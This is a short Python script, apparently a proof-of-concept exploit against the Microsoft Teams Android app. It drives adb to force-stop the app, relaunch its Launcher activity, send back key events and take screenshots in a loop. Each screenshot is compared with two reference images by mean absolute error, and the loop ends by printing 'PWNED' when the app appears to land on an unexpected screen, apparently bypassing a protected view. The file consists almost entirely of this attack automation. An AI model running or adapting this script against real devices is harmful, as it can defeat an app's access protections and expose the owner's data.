from PIL import Image
import numpy as np
import subprocess
import time

# Requirements:
# install adb tools
# python3 -m pip install pillow
# python3 -m pip install numpy

def image_similarity(image1_path, image2_path, image3_path):
    
    # Load the images
    image1 = Image.open(image1_path)
    image2 = Image.open(image2_path)
    image3 = Image.open(image3_path)

    # Check if the dimensions of the images are the same
    if image1.size != image2.size:
        return "Las im√°genes tienen diferentes dimensiones y no se pueden comparar."

    # Convert the images to RGB mode (if they are not already).
    image1 = image1.convert("RGB")
    image2 = image2.convert("RGB")
    image3 = image3.convert("RGB")

    array1 = np.array(image1)
    array2 = np.array(image2)
    array3 = np.array(image3)

    # Calculate the Mean Absolute Error (MAE) between the two images
    diff1 = np.abs(array1 - array2)
    diff2 = np.abs(array1 - array3)
    mae1 = np.mean(diff1)
    mae2 = np.mean(diff2)
    # Define the threshold used to compare images
    threshold = 10  # You can adjust this value according to your needs

    # Compare first MAE with the threshold
    if mae1 <= threshold:
        # Images are Similar
        flag1 = True;
    else:
        # Images are Different
        flag1 = False;

    # Compare second MAE with the threshold
    if mae2 <= threshold:
        # Images are Similar
        flag2 = True;
    else:
        # Images are Different
        flag2 = False;
    
    if flag1 == False and flag2 == False:
        return False
    else:
        return True

def adb():

    # Stop the APP
    comando_bash = "adb shell am force-stop com.microsoft.teams"
    subprocess.run(comando_bash, shell=True, capture_output=True, text=True)
    time.sleep(1)

    # Force a go back key event to check that you are in the phone launcher
    comando_bash = "adb shell input keyevent KEYCODE_BACK"
    subprocess.run(comando_bash, shell=True, capture_output=True, text=True)
    subprocess.run(comando_bash, shell=True, capture_output=True, text=True)

    # Start Launcher activity
    comando_bash = "adb shell am start -n com.microsoft.teams/com.microsoft.skype.teams.Launcher"
    subprocess.run(comando_bash, shell=True, capture_output=True, text=True)
    time.sleep(0.9)

    # Go back key event
    comando_bash = "adb shell input keyevent KEYCODE_BACK"
    subprocess.run(comando_bash, shell=True, capture_output=True, text=True)
    time.sleep(3)

    # Take an screenshot
    comando_bash = "adb shell screencap -p > exploit.png"
    subprocess.run(comando_bash, shell=True, capture_output=True, text=True)

# Ejemplo de uso
if __name__ == "__main__":
    
    # image2 and image3 are the possibles activities that return the APP when try to exploit

    image1_path = "exploit.png"  # Replace with the screenshot path
    image2_path = "mobile/image2.png"  # Replace with the image2 path
    image3_path = "mobile/image3.png"  # Replace with the image3 path
    flag = True
    while flag:
        adb()
        flag = image_similarity(image1_path, image2_path, image3_path)
    
    print("PWNED")